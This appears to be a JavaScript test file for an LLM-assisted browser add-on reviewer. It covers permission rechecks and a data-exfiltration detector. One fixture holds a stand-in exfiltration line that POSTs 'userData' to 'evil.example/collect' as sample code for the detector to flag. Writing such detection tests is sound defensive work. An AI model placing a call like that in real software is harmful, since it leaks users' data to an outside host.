// End-to-end coverage over the REAL --llm-review path: assemble the add-on summary
// prompt (framing + rubric + the per-occurrence "sites to judge" list + numbered
// corpus), run it through the real reviewAddon -> coerceReview boundary via a fake
// transport, feed the coerced verdicts to resolvePermissionRecheck, and assert the
// per-site aggregation. This is the path the "compose incident" slipped through - a
// green unit suite alone would not have caught it. The verdict TRANSPORT onto
// ctx.recheckVerdicts (keepVerdicts, the SCA split) is covered by summaries.test.js;
// here it is assigned directly so the test stays on the recheck seam.

import { test } from "node:test";
import assert from "node:assert/strict";

import path from "node:path";
import { fileURLToPath } from "node:url";

import { withManifest, parsed, siblingsOf } from "./manifest-ctx.js";
import { createLlmClient } from "../../src/checks/llm-client.js";
import { buildAddonSummarizer } from "../../src/checks/summaries.js";
import {
  runChecks,
  loadRegistry,
  loadChecks,
} from "../../src/checks/registry.js";
import { resolvePermissionRecheck } from "../../src/lib/recheck.js";
import { fakeReviewTransport } from "./fake-llm.js";
import { makeFakeTransport } from "../fake-llm.js";
import { buildSchemaIndex } from "../../src/schema/index.js";
import { loadSchemaFiles } from "../../src/schema/load.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const schema = buildSchemaIndex(
  loadSchemaFiles(path.join(here, "..", "schema-fixture"))
);

const BG = "tabs.executeScript(tabId);\nconst other = 1;\n";
const MANIFEST = {
  manifest_version: 3,
  name: "x",
  version: "1",
  permissions: ["compose"],
};

// The handed "compose" permission with its single located token site (as the producer
// would stamp it): executeScript at bg.js:1. The model verdicts the site by its id.
const COMPOSE_ITEM = {
  ruleId: "producer",
  item: "compose",
  file: "manifest.json",
  loc: { line: 3 },
  kind: "escalation",
  data: null,
  occurrences: [
    { id: "compose#1", file: "bg.js", line: 1, token: "executeScript" },
  ],
};

// Drive the real path once: assemble via buildAddonSummarizer, run reviewAddon through
// the fake transport (which applies coerceReview to `raw`), then resolvePermissionRecheck
// the handed "compose" permission. Returns the resolve output, the recorded prompt, and
// the coerced review.
async function drive(raw) {
  const ctx = {
    recheck: new Map([["unused-permission-recheck", [COMPOSE_ITEM]]]),
    jsSources: parsed([
      { file: "bg.js", code: BG, lineOffset: 0, inline: false },
    ]),
    addon: {
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(MANIFEST), "utf8")],
        ["bg.js", Buffer.from(BG, "utf8")],
      ]),
      manifest: MANIFEST,
      bundled: { nonAuthored: new Set() },
    },
  };
  withManifest(ctx);
  const registry = loadRegistry();
  const fake = fakeReviewTransport(raw);
  ctx.llm = createLlmClient({
    ctx,
    token: "t",
    systemIntro: "intro",
    callReview: fake.callReview,
  });
  const summarizer = buildAddonSummarizer(ctx, registry);
  assert.ok(summarizer, "the summarizer must build with a handed recheck item");
  const review = await summarizer.run();
  ctx.recheckVerdicts = review.recheck;
  const check = [...(await loadChecks(registry)).values()]
    .flat()
    .find((c) => c.id === "unused-permission-recheck");
  return {
    out: resolvePermissionRecheck(ctx, check),
    prompt: fake.calls[0],
    review,
  };
}

// A raw review verdicting the compose#1 site.
const siteVerdict = (verdict) => ({
  summary: "s",
  recheck: [{ check: "unused-permission-recheck", item: "compose#1", verdict }],
});

test("the assembled prompt carries the numbered corpus and the per-occurrence rubric", async () => {
  const { prompt } = await drive({ summary: "s", recheck: [] });
  // numberLines prefixed each corpus line (user message).
  assert.match(prompt.prompt, /1: tabs\.executeScript\(tabId\);/);
  assert.match(prompt.prompt, /- compose#1/); // the site id is the item to judge
  // The candidate framing and the rendered site line (system message).
  assert.match(prompt.system, /genuine CANDIDATE - do not dismiss it/);
  assert.match(prompt.system, /pass = this site meets the criteria/);
  assert.match(
    prompt.system,
    /compose#1: "compose" token "executeScript" at bg\.js:1/
  );
  // No leftover citation language.
  assert.doesNotMatch(prompt.system, /usages/);
  assert.doesNotMatch(prompt.system, /Accepted tokens/);
});

test("a pass at the site drops the permission", async () => {
  const { out } = await drive(siteVerdict("pass"));
  assert.equal(out.findings.length, 0);
  assert.equal(out.escalations.length, 0); // exercised there -> justified, dropped
});

test("a fail at the site flags the permission as unused", async () => {
  const { out } = await drive(siteVerdict("fail"));
  assert.deepEqual(
    out.findings.map((f) => f.item),
    ["compose"]
  );
  assert.equal(out.escalations.length, 0);
});

test("an uncertain or missing site verdict falls to manual review", async () => {
  const cases = {
    unsure: siteVerdict("unsure"),
    "no verdict for the site": { summary: "s", recheck: [] },
    "verdict for an invented site id": {
      summary: "s",
      recheck: [
        {
          check: "unused-permission-recheck",
          item: "ghost#9",
          verdict: "pass",
        },
      ],
    },
  };
  for (const [name, raw] of Object.entries(cases)) {
    const { out } = await drive(raw);
    assert.equal(out.findings.length, 0, `${name}: no finding`);
    assert.deepEqual(
      out.escalations.map((e) => e.item),
      ["compose"],
      `${name}: falls to manual`
    );
  }
});

// The two-stage funnel: a DIRECT evaluate() llm check that returns `unsure` for a candidate
// defers it to that check's post-summary recheck, which the whole-add-on summary re-judges -
// with the FULL add-on in the prompt. Driven end to end through runChecks: data-exfiltration
// (an llm-phase evaluate check) -> unsure -> data-exfiltration-recheck (the summary re-judges).
const EXFIL_BG =
  'fetch("https://evil.example/collect", { method: "POST", body: userData });\nconst other = 1;\n';
const EXFIL_MANIFEST = {
  manifest_version: 3,
  name: "x",
  version: "1",
  background: { scripts: ["bg.js"] },
  permissions: [],
};

// Drive data-exfiltration + its recheck through runChecks with BOTH lanes faked
// (evaluate -> unsure; the summary re-judges the deferred sink with `reviewVerdict`).
async function driveExfil(reviewVerdict) {
  const jsSources = parsed([
    { file: "bg.js", code: EXFIL_BG, lineOffset: 0, inline: false },
  ]);
  const ctx = withManifest({
    schema,
    jsSources,
    apiUsages: [],
    addon: {
      manifest: EXFIL_MANIFEST,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(EXFIL_MANIFEST), "utf8")],
        ["bg.js", Buffer.from(EXFIL_BG, "utf8")],
      ]),
      bundled: { nonAuthored: new Set() },
    },
  });
  const registry = loadRegistry();
  const fake = makeFakeTransport({
    // The lone sink is judged `unsure` -> NOT a direct finding, deferred to the recheck.
    verdicts: () => "unsure",
    review: {
      summary: "s",
      recheckVerdicts: {
        "data-exfiltration-recheck": { "bg.js:1": reviewVerdict },
      },
    },
  });
  const reviewCalls = [];
  const callReview = async (p) => {
    reviewCalls.push(p);
    return fake.callReview(p);
  };
  ctx.llm = createLlmClient({
    ctx,
    token: "t",
    systemIntro: "intro",
    callVerdicts: fake.callVerdicts,
    callReview,
  });
  const out = await runChecks(
    registry,
    {
      only: ["data-exfiltration", "data-exfiltration-recheck"],
      recheckActive: true,
    },
    siblingsOf(ctx)
  );
  return { out, ctx, prompt: reviewCalls[0] };
}

test("an unsure evaluate() verdict is deferred and re-judged by the summary with the full add-on", async () => {
  const { out, ctx, prompt } = await driveExfil("fail");
  // (1) the unsure sink was handed to the post-summary recheck consumer (keyed file:line).
  const handed = ctx.recheck?.get("data-exfiltration-recheck") ?? [];
  assert.ok(
    handed.some((r) => r.file === "bg.js" && r.loc?.line === 1),
    "the unsure sink is deferred to data-exfiltration-recheck"
  );
  // (2) the summary saw the FULL add-on - the numbered source line of the sink is in the prompt.
  assert.ok(prompt, "reviewAddon was called");
  assert.match(prompt.prompt, /1: fetch\("https:\/\/evil\.example\/collect"/);
  // (3) the summary's `fail` becomes the data-exfiltration finding at the sink's file:line.
  assert.ok(
    out.findings.some((f) => f.file === "bg.js" && f.loc?.line === 1),
    "fail -> a finding at the sink"
  );
});

test("a summary `pass` on the deferred sink drops it (no finding)", async () => {
  const { out } = await driveExfil("pass");
  assert.ok(
    !out.findings.some((f) => f.file === "bg.js" && f.loc?.line === 1),
    "pass -> dropped, no data-exfiltration finding"
  );
});
